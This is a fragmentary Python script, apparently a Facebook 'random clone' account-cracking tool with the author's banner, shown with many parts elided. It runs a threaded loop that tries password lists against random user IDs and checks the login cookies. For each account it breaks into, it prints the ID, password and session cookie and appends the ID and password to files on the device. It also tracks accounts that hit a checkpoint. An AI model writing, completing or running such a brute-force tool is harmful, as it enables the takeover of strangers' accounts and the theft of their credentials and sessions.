...
for ua in range(5000):
    ...
    ugen.append(uaku2)
os.system("espeak \"well come,to the monster SALIM Bangladesh Random Cloning Start Please Wait\"")
...
\033[1;32m=================================================
       .   Author: Md Salim Sarker
          Telegram   : NAI         
          Facebook   : MD Salim Sarker
          Github     : NAI   
          Version    : \033[1;96mRANDOM CLONE \033[1;31m[FREE•3]\x1b[0m
\033[1;31m==================================================           
\x1b[0;97m\x1b[1;43m         🍂  SALIM IS A BRAND ❤️‍🔥        \x1b[0m
""")
A = '\x1b[1;97m' 
B = '\x1b[1;96m' 
C = '\x1b[1;91m' 
...
def SHOAIB():
    os.system('clear')
    os.system('xdg-open https://www.facebook.com/mdsalimsarkarofficial1/')
    print(logo)
...
def main():
    ...
    with ThreadPool(max_workers=100) as SHOAIB:
        ...
        print(f"\033[1;31m[\033[1;96m•\033[1;31m] \033[1;31mFILE SAVE IN /sdcard/SALIM-OK🥰.txt")
        print('\033[1;32m='*50)
        for guru in user:
...
def rcrack(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write(f'\r \033[1;31m[%sSALIM-SARKER\033[1;31m]\033[1;34m\033[1;31m[\033[38;5;195m%s/%s\033[1;31m]\033[1;34m\033[38;5;45mOK-\033[38;5;46m%s\r'%(bi,loop,tl,len(oks))),
            sys.stdout.flush()
    ...
    'viewport-width': '980',}
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[65:80]
                print(f"\033[1;33m[SALIM-OK🥰] {uid} • {ps}" '  \n\033[1;33m [🍁]\033[1;33mCookie = \033[1;32m'+coki+  ' \n\033[1;33m [😜] \033[1;32mUa = \033[1;34m'+pro+'  \033[0;97m')
                os.system("espeak \"SALIM, OK, ID \"")
                open('/sdcard/SALIM-OK🥰.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print(f"\033[1;32m[SALIM-CP😔] \033[1;31m{uid} • {ps}")
                os.system("espeak \"SALIM, CP, ID \"")
                open('/sdcard/SALIM-CP😔.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
